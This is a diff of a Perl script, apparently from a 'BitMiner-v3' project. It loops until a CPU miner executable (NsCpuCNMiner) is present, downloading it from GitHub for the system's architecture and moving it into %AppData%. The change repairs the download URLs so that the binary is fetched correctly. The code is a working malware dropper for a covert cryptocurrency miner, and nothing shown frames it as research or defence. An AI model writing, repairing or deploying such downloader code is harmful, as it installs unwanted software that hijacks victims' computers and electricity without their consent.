@@ -114,9 +114,9 @@ while(1){
   $check = qx/dir %AppData%/;
   while($check !~ m/NsCpuCNMiner\.exe/){
     if($Config{archname} =~ /x86_64/ || $Config{archname} =~ /x64/){
-      getstore(\'http://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner64.exe\', \'NsCpuCNMiner.exe\');
+      getstore(\'https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\', \'NsCpuCNMiner.exe\');
     }else{
-      getstore(\'http://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner32.exe\', \'NsCpuCNMiner.exe\');
+      getstore(\'https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\', \'NsCpuCNMiner.exe\');
     }
     if(-e \'NsCpuCNMiner.exe\'){
       system(\'move NsCpuCNMiner.exe %AppData%\');
